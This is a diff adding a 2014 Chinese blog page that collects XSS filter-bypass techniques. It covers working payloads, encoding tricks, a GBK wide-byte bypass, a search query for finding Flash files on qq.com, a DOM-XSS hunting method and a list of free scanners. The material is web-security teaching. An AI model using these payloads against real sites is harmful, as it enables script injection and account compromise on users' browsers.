@@ -1,0 +1,772 @@
+<!doctype html>
+<html class="theme-next use-motion theme-next-mist">
+<head>
+  
+
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+  <meta name="google-site-verification" content="DRmBBL5LYsJ_2wCsJIYYsBfu8hVW8DQYzmpqGMp-njU" />
+
+
+
+
+
+  <link rel="stylesheet" type="text/css" href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5"/>
+
+
+
+
+<link rel="stylesheet" type="text/css" href="/css/main.css?v=0.4.5.1"/>
+
+
+    <meta name="description" content="水中月.镜中花.浮华一片苍凉.." />
+
+
+
+  <meta name="keywords" content="xss," />
+
+
+
+  <link rel="alternate" href="/atom.xml" title="idhyt's blog" type="application/atom+xml" />
+
+
+
+  <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.5.1" />
+
+
+<meta name="description" content="xss绕过技巧整理
+几种弹窗绕过1234567891011121314151617181920alert(1) = Function(alert(1))()= Function(String.fromCharCode(97,108,101,114,116,40,49,41))()97,108,101,114,116,40,49,41对应alert(1) ascii码的10进制形式（Text2Dec">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xss bypass">
+<meta property="og:url" content="http://blog.idhyt.com/2014/10/15/technic-xss-bypass/index.html">
+<meta property="og:site_name" content="idhyt's blog">
+<meta property="og:description" content="xss绕过技巧整理
+几种弹窗绕过1234567891011121314151617181920alert(1) = Function(alert(1))()= Function(String.fromCharCode(97,108,101,114,116,40,49,41))()97,108,101,114,116,40,49,41对应alert(1) ascii码的10进制形式（Text2Dec">
+<meta property="og:updated_time" content="2015-12-31T11:53:23.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="xss bypass">
+<meta name="twitter:description" content="xss绕过技巧整理
+几种弹窗绕过1234567891011121314151617181920alert(1) = Function(alert(1))()= Function(String.fromCharCode(97,108,101,114,116,40,49,41))()97,108,101,114,116,40,49,41对应alert(1) ascii码的10进制形式（Text2Dec">
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var CONFIG = {
+    scheme: 'Mist',
+    sidebar: 'post'
+  };
+</script>
+
+  <title> xss bypass | idhyt's blog </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  <!--[if lte IE 8]>
+  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
+    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
+      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
+           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
+           style='margin-left:auto;margin-right:auto;display: block;'/>
+    </a>
+  </div>
+<![endif]-->
+  
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-71783676-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?5228d77c5752954f270fcca0908555af";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+  <div class="container one-column page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><h1 class="site-meta">
+  <span class="logo-line-before"><i></i></span>
+  <a href="/" class="brand" rel="start">
+      <span class="logo">
+        <i class="icon-next-logo"></i>
+      </span>
+      <span class="site-title">云淡风轻</span>
+  </a>
+  <span class="logo-line-after"><i></i></span>
+</h1>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu menu-left">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            <i class="menu-item-icon icon-next-home"></i> <br />
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            <i class="menu-item-icon icon-next-categories"></i> <br />
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            <i class="menu-item-icon icon-next-archives"></i> <br />
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            <i class="menu-item-icon icon-next-tags"></i> <br />
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            <i class="menu-item-icon icon-next-about"></i> <br />
+            关于
+          </a>
+        </li>
+      
+
+      
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  
+  <form class="site-search-form">
+    <input type="text" id="st-search-input" class="st-search-input st-default-search-input" />
+  </form>
+
+
+<script type="text/javascript">
+  (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
+    (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
+    e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
+  })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
+
+  _st('install', 'VpXUP87KQneoFZ3srxxA','2.0.0');
+</script>
+
+
+
+    </div>
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div id="content" class="content"> 
+
+  <div id="posts" class="posts-expand">
+    
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+
+      
+      
+        <h1 class="post-title" itemprop="name headline">
+          
+          
+            
+              xss bypass
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          发表于
+          <time itemprop="dateCreated" datetime="2014-10-15T11:56:24+08:00" content="2014-10-15">
+            2014-10-15
+          </time>
+        </span>
+
+        
+          <span class="post-category" >
+            &nbsp; | &nbsp; 分类于
+            
+              <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                <a href="/categories/technic/" itemprop="url" rel="index">
+                  <span itemprop="name">technic</span>
+                </a>
+              </span>
+
+              
+              
+
+            
+          </span>
+        
+
+        
+          
+            <span class="post-comments-count">
+            &nbsp; | &nbsp;
+            <a href="/2014/10/15/technic-xss-bypass/#comments" itemprop="discussionUrl">
+              <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2014/10/15/technic-xss-bypass/" itemprop="commentsCount"></span>
+            </a>
+          </span>
+          
+        
+      </div>
+    </header>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        <span itemprop="articleBody"><p>xss绕过技巧整理</p>
+<h3 id="几种弹窗绕过">几种弹窗绕过</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">alert(<span class="number">1</span>) = <span class="built_in">Function</span>(alert(<span class="number">1</span>))()</span><br><span class="line">= <span class="built_in">Function</span>(<span class="built_in">String</span>.fromCharCode(<span class="number">97</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">49</span>,<span class="number">41</span>))()</span><br><span class="line"><span class="number">97</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">49</span>,<span class="number">41</span>对应alert(<span class="number">1</span>) ascii码的<span class="number">10</span>进制形式（Text2Dec）</span><br><span class="line"><span class="comment">//小写function</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="number">1</span>)</span><br><span class="line">&#125;)()</span><br><span class="line"></span><br><span class="line">alert(<span class="number">1</span>) confirm(<span class="number">1</span>)  prompt(<span class="number">1</span>)</span><br><span class="line">&lt;SVG/onload=prompt(<span class="number">1</span>)&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="title">BODY</span> <span class="attribute">onload</span>=<span class="value">"alert('XSS')"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">img</span> <span class="attribute">src</span>=<span class="value">1</span> <span class="attribute">onerror</span>=<span class="value">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">img</span> <span class="attribute">src</span> <span class="attribute">onerror</span>=<span class="value">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span> <span class="attribute">src</span>=<span class="value">alert(1)</span>&gt;</span><span class="handlebars"><span class="xml"><span class="tag">&lt;/<span class="title">scirpt</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">form</span> <span class="attribute">action</span>=<span class="value">"javascript:prompt(1)"</span> <span class="attribute">method</span>=<span class="value">"post"</span>&gt;</span><span class="tag">&lt;<span class="title">input</span> <span class="attribute">name</span>=<span class="value">"action"</span> <span class="attribute">value</span>=<span class="value">"b"</span>&gt;</span><span class="tag">&lt;/<span class="title">form</span>&gt;</span> </span><br><span class="line"></span><br><span class="line">eg:</span><br><span class="line"><span class="tag">&lt;<span class="title">p</span> <span class="attribute">class</span>=<span class="value">"comment"</span> <span class="attribute">title</span>=<span class="value">""</span>&gt;</span><span class="tag">&lt;<span class="title">svg</span>/<span class="attribute">a</span>=<span class="value">"&gt;&lt;/p&gt;</span><br><span class="line">&lt;p class="</span><span class="value">comment"</span> <span class="attribute">title</span>=<span class="value">""</span><span class="value">onload='</span>/*"&gt;</span><span class="tag">&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">p</span> <span class="attribute">class</span>=<span class="value">"comment"</span> <span class="attribute">title</span>=<span class="value">"*/prompt(1)'"</span>&gt;</span><span class="tag">&lt;/<span class="title">p</span>&gt;</span>   ==》<span class="tag">&lt;<span class="title">p</span> <span class="attribute">class</span>=<span class="value">"comment"</span> <span class="attribute">title</span>=<span class="value">""</span>&gt;</span><span class="tag">&lt;<span class="title">svg</span>/<span class="attribute">a</span>=<span class="value">""</span><span class="value">xxx"</span>/<span class="attribute">onload</span>=<span class="value">'prompt(21)'</span><span class="value">"&gt;&lt;/p&gt;</span></span></span></span></span></span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//过滤= 括号等 使用xml编码</span></span><br><span class="line">&lt;svg&gt; <span class="xml"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="undefined">prompt&amp;#40;1)</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>  </span><br><span class="line">//在SVG向量里面的<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="undefined">元素（或者其他CDATA元素 ），会先进行xml解析。因此&amp;#x28（十六进制）或者&amp;#40（十进制）或者&amp;lpar；（html实体编码）会被还原成（。</span></span></span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">可以不封的有:</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="title">img</span>&gt;</span><span class="tag">&lt;<span class="title">br</span>&gt;</span><span class="tag">&lt;<span class="title">input</span>&gt;</span><span class="tag">&lt;<span class="title">li</span>&gt;</span><span class="tag">&lt;<span class="title">p</span>&gt;</span><span class="tag">&lt;<span class="title">SVG</span>&gt;</span></span><br><span class="line">其他标签不封闭会造成页面显示错误等问题。</span></span><br></pre></td></tr></table></figure>
+<h3 id="xss中最经常用到的编码">xss中最经常用到的编码</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">html实体编码(<span class="number">10</span>进制与<span class="number">16</span>进制):</span><br><span class="line">如把尖括号编码[ <span class="xml"><span class="tag">&lt; ]  <span class="attribute">-----</span>&gt;</span> html十进制: &amp;#60;  html十六进制:&amp;#x3c;</span><br><span class="line">javascript的八进制跟十六进制:</span><br><span class="line">如把尖括号编码[ <span class="tag">&lt; ]  <span class="attribute">-----</span>&gt;</span> js八进制:\74  js十六进制:\x3c</span><br><span class="line">jsunicode编码：</span><br><span class="line">如把尖括号编码[ <span class="tag">&lt; ]  <span class="attribute">-----</span>&gt;</span>jsunicode:\u003c</span><br><span class="line">url编码:</span><br><span class="line">如把尖括号编码[ <span class="tag">&lt; ]  <span class="attribute">-----</span>&gt;</span> url: %22</span><br><span class="line">base64编码:</span><br><span class="line">如把尖括号编码[ <span class="tag">&lt; ]  <span class="attribute">-----</span>&gt;</span> base64: Ig==</span></span><br></pre></td></tr></table></figure>
+<h3 id="一些绕过方法">一些绕过方法</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">换行符 %<span class="number">0</span>a</span><br><span class="line">反斜线 %<span class="number">5</span>c （js中字符串可以用\分开）</span><br><span class="line">&lt;&gt;  %<span class="number">3</span>C%<span class="number">3</span>E</span><br><span class="line">注释<span class="comment">/**/</span>可以代替 空格符</span><br><span class="line">%c0(宽字符gb2312)可以吃掉%<span class="number">5</span>c(反斜线) </span><br><span class="line">javascript中的字符可以写成unicode编码：</span><br><span class="line">&lt; 可以表示为 \u003c , &gt; 可以表示为 \u003e，空格可以表示为\u0020</span><br><span class="line">&lt; 可以表示为 \x3c , &gt; 可以表示为 \x3e，空格可以表示为\x20</span><br><span class="line">&lt;img src=<span class="number">1</span> onerror=alert(<span class="number">1</span>)&gt;   ----&gt; \u003Cimg\u0020src=<span class="number">1</span>\u0020onerror=alert(<span class="number">1</span>)\u003e</span><br><span class="line">                                                 ----&gt;  \x3Cimg\u0020src=<span class="number">1</span>\u0020onerror=alert(<span class="number">1</span>)\x3e</span><br><span class="line"></span><br><span class="line">JS字符串中，字符还可以表示为unicode的形式。即：单引号还可以表示为\u0027或\x27,可尝试\有没有被过滤</span><br><span class="line">&lt;textarea&gt;、&lt;title&gt;、&lt;iframe&gt;标签不解析HTML</span><br><span class="line"><span class="string">"h"</span>+<span class="string">"t"</span>+<span class="string">"t"</span>+<span class="string">"p"</span>，绕过对http的过滤</span><br><span class="line">&lt;input onfocus=<span class="string">"alert(1)"</span> autofocus&gt;，自动执行</span><br><span class="line">&lt;scr&lt;script&gt;ipt&gt;绕过对&lt;script&gt;的过滤</span><br><span class="line"><span class="comment">/**/</span>绕过对空格的过滤&lt;script&gt;<span class="built_in">document</span>.write(<span class="string">"&lt;img/**/src='1'/**/onerror='alert(1)'/&gt;"</span>);<span class="xml"><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="actionscript">标签中多对输入可以结合<span class="comment">/**/</span>的使用</span><br><span class="line"><span class="keyword">var</span> a = <span class="string">""</span>;<span class="comment">/*"; 值为：";<span class="comment">/*，（首先闭合双引号，然后使用<span class="comment">/*注释，与下面注释进行闭合）var b = "*/</span>alert(1)//"; 值为：*/</span>alert(1)//</span><br><span class="line"></span><br><span class="line">如果是图片可能是判定后缀名在最后加上.jpg</span><br><span class="line">突破对长度的限制&lt;script&gt;eval(location.hash.slice(1))</span></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>#alert(‘a’)</span><br><span class="line">data协议，绕过chrome </span><br><span class="line">filter.php?url=<span class="tag">&lt;<span class="title">a</span> <span class="attribute">href</span>=<span class="value">'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='</span>&gt;</span>click<span class="tag">&lt;<span class="title">a</span>&gt;</span></span><br><span class="line">IE的注释方式<span class="comment">&lt;!--[if IE]&gt;&lt;img src=# width=0 height=0 onerror=alert(/insight-labs/)&gt;&lt;![endif]--&gt;</span></span><br><span class="line"></span><br><span class="line">chrome会自动对", &gt;, <span class="tag">&lt; 进行转换。</span><br><span class="line">&lt;<span class="attribute">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br><span class="line">chrome会过滤为<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>,绕过：<span class="tag">&lt;<span class="title">script</span> <span class="attribute">src</span>=<span class="value">'127.0.0.1/1.js'</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span> 其中1.jp也可以是1.jpg等，内容为js代码如:alert(1)</span></span><br></pre></td></tr></table></figure>
+<h3 id="chrome如何搜索关键字">chrome如何搜索关键字</h3><p>基本语句肯定是 site:qq.com filetype:swf<br>意思是，限定域名为qq.com 文件类型为FLASH文件。<br>显然这样会搜索出很多FLASH文件，不利于我们后续的漏洞查找，所以我们需要输入某个关键词来进一步缩小范围。<br>这里我列举一些寻找关键词的方式。<br>1 已知存在缺陷的FLASH文件名或参数名，如：swfupload,jwplayer等<br>2 多媒体功能的FLASH文件名，如：upload，player, music, video等<br>3 调用的外部配置或数据文件后缀，如: xml, php 等<br>4 前期经验积累下来的程序员特征参数名用词，如: callback, cb , function 等<br>结合以上经验，使用其中第三条：<br>搜索： site:qq.com filetype:swf inurl:xml<br>可以找到这个FLASH</p>
+<h3 id="插入漏洞方式">插入漏洞方式</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">1 JavaScript中字符串之间的运算利用</span><br><span class="line">&lt;a href="javascript:alert(1)//html"&gt;click me&lt;/a&gt;</span><br><span class="line">&lt;a href="javascript:alert(1)-html"&gt;click me&lt;/a&gt;</span><br><span class="line">执行呈现相同的效果，因为javascript是弱类型语言，所以字符串与字符串之间的各种运算都是合法的</span><br><span class="line"></span><br><span class="line">2 HTML属性在执行时会做HTMLDecode编码</span><br><span class="line">HTML属性：十进制和十六进制，&amp;#56和&amp;#x5a形式 </span><br><span class="line">CSS属性：十进制和十六进制，\6c形式</span><br><span class="line">JavaScript：八进制和十六进制，\56,和\x5c形式，汉字需要使用Unicode编码，\u0000形式</span><br><span class="line">&lt;img src="http://www.baidu.com/img/bdlogo.gif"&gt;</span><br><span class="line">&lt;img src="&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3a;&amp;#x2f;&amp;#x2f;&amp;#x77;&amp;#x77;&amp;#x77;&amp;#x2e;&amp;#x62;&amp;#x61;&amp;#x69;&amp;#x64;&amp;#x75;&amp;#x2e;&amp;#x63;&amp;#x6f;&amp;#x6d;&amp;#x2f;&amp;#x69;&amp;#x6d;&amp;#x67;&amp;#x2f;&amp;#x62;&amp;#x64;&amp;#x6c;&amp;#x6f;&amp;#x67;&amp;#x6f;&amp;#x2e;&amp;#x67;&amp;#x69;&amp;#x66;";&gt;</span><br><span class="line">需要留出双引号，不可对双引号进行转移</span><br><span class="line"></span><br><span class="line">3、宽字节处理addslashs，单引号、双引号、反斜杠之前加反斜杠的情况</span><br><span class="line">原理：网页头部指明这是GBK编码，GBK编码第一字节的范围是0x81~0xFE，第二字节的范围是0x40~0x7E与0x80~0xFE，这样的十六进制表示。而\符号的十六进制表示为0x5C，正好是GBK的低字节中，如果之前有一个高字节，那么正好会被组成一个合法字符。</span><br><span class="line">&lt;?php </span><br><span class="line">header("Content-Type:text/html;charset=GBK");?&gt;  </span><br><span class="line">&lt;script&gt;      </span><br><span class="line">var a="</span><br><span class="line">&lt;?php </span><br><span class="line">echo addslashes($_GET['url']);</span><br><span class="line">?&gt;</span><br><span class="line">";  </span><br><span class="line">&lt;/script&gt;</span><br><span class="line">?&gt;  构造：.php?url=123%81";alert(1);//</span><br><span class="line"></span><br><span class="line">4、UTF-7编码(仅IE支持，会自动判断是否出现UTF-7编码的字符串)</span><br></pre></td></tr></table></figure>
+<h3 id="DOM_xss特点">DOM xss特点</h3><ol>
+<li>利用代码也是在地址栏里输入，</li>
+<li>在JS里，通过location.search得到地址里的代码，类似的还有:<br>A.location.href : 地址栏里的地址,<br>B.location.hash: 地址栏里#及其之后的内容,<br>C.document.referrer: 当前页面的源（比如你从A.com点一个链接进入了B.com，那么B.com里的document.referrer等于A.com）</li>
+<li>通过JS设置了iframe的src属性，这是一个典型的通过JS操作属性而导致的XSS。</li>
+</ol>
+<p>查找此类漏洞的方法 </p>
+<ol>
+<li>以location为关键词进行查找，</li>
+<li>进而看location传入的参数是否被过滤后再进行使用。</li>
+<li>如有未过滤而被调用的情况，则考虑如何构造利用代码。</li>
+</ol>
+<h3 id="11个免费的Web安全测试工具">11个免费的Web安全测试工具</h3><p>1.Netsparker Community Edition(Windows)<br>这个程序可以检测SQL注入和跨页脚本事件。当检测完成之后它会给你提供一些解决方案。<br>2.Websecurify(Windows, Linux, Mac OS X)<br>这是个简单易用的开源工具，此程序还有一些人插件支持，可以自动检测网页漏洞。运行后可生成多种格式的检测报告<br>3.Wapiti(Windows, Linux, Mac OS X)<br>这是一个用Python编写的开源的工具，可以检测网页应用程序，探测网页中存在的注入点。<br>4.N-Stalker Free Version(Windows)<br>此工具可一次检测100个以上的页面，包括跨页脚本的检测。<br>5.skipfish(Windows, Linux, Mac OS X)<br>这是一个轻量级的安全测试工具，处理速度很快，每秒可处理2000个请求。<br>6.Scrawlr(Windows)<br>HP的一款免费软件，可检测SQL注入漏洞。<br>7.Watcher(Windows) <a href="http://websecuritytool.codeplex.com/documentation" target="_blank" rel="external">http://websecuritytool.codeplex.com/documentation</a><br>这个是Fiddler的插件，可在后台静默运行，可检测跨域提交等。。<br>8.x5s(Windows) <a href="http://xss.codeplex.com/releases/view/43170" target="_blank" rel="external">http://xss.codeplex.com/releases/view/43170</a><br>跟前一个一样也是Fiddler的插件，用于检测存在XSS漏洞，在网页提供给用户输入的地方是否有过滤&lt;, &gt;等字符。<br>9.Exploit-Me(Windows, Linux, Mac OS X)<br>这个是火狐的插件，由XSS-Me，SQL Inject Me 和 Access-Me 这3个构成，当浏览网页时就会开始检测，可检测XSS漏洞，SQL注入漏洞等。<br>10.WebScarab(Windows, Linux, Mac OS X)<br>这个实际上是一个代理软件，有很多功能，可以检测XSS跨站脚本漏洞、SQL注入漏洞等。。<br>11.Acunetix Free Version(Windows)<br>这个是免费版，相对于专业版来说有一些功能限制，不过还是可以用的，可检测网站上的XSS漏洞。</p>
+<h3 id="其他">其他</h3><p>1.二哥的XSS教学 - by gainover<br><a href="http://xsst.sinaapp.com/example/1-1.php" target="_blank" rel="external">http://xsst.sinaapp.com/example/1-1.php</a><br>2.心伤的瘦子 [腾讯实例教程] 那些年我们一起学XSS)<br><a href="http://www.wooyun.org/whitehats/%E5%BF%83%E4%BC%A4%E7%9A%84%E7%98%A6%E5%AD%90/type/1/page/1" target="_blank" rel="external">http://www.wooyun.org/whitehats/%E5%BF%83%E4%BC%A4%E7%9A%84%E7%98%A6%E5%AD%90/type/1/page/1</a><br>3.HTML特殊字符编码对照表<br><a href="http://www.jb51.net/onlineread/htmlchar.htm" target="_blank" rel="external">http://www.jb51.net/onlineread/htmlchar.htm</a><br>4.html字符实体<br><a href="http://www.w3school.com.cn/html/html_entities.asp" target="_blank" rel="external">http://www.w3school.com.cn/html/html_entities.asp</a><br>5.xss字符转换工具：<br><a href="http://app.baidu.com/app/enter?appid=280383" target="_blank" rel="external">http://app.baidu.com/app/enter?appid=280383</a></p>
+</span>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/xss/" rel="tag">#xss</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2015/01/02/diary-annual-summary-2014/" rel="prev">我逝去的2014</a>
+            
+          </div>
+
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2014/09/10/virus-malware-driver-hmbb/" rel="next">病毒分析-haimianbaobao流氓驱动</a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        <div class="bdsharebuttonbox">
+	<a href="#" class="bds_more" data-cmd="more"></a>
+	<a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+	<a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+	<a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+	<a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+	<a href="#" class="bds_tqq" data-cmd="tqq" title="分享到腾讯微博"></a>
+	<a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+</div>
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"1","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+      
+    </div>
+  </div>
+
+ </div>
+
+        
+
+        
+          <div class="comments" id="comments">
+            
+              <div id="disqus_thread">
+                <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+              </div>
+            
+          </div>
+        
+      </div>
+
+      
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" src="/images/default_avatar.jpg" alt="idhyt" itemprop="image"/>
+          <p class="site-author-name" itemprop="name">idhyt</p>
+        </div>
+        <p class="site-description motion-element" itemprop="description">水中月.镜中花.浮华一片苍凉..</p>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">48</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          <div class="site-state-item site-state-categories">
+            <a href="/categories">
+              <span class="site-state-item-count">7</span>
+              <span class="site-state-item-name">分类</span>
+              </a>
+          </div>
+
+          <div class="site-state-item site-state-tags">
+            <a href="/tags">
+              <span class="site-state-item-count">22</span>
+              <span class="site-state-item-name">标签</span>
+              </a>
+          </div>
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="menu-item-icon icon-next-feed"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="http://github.com/idhyt" target="_blank">GitHub</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/1706893103" target="_blank">Weibo</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.zhihu.com/people/idhyt" target="_blank">ZhiHu</a>
+              </span>
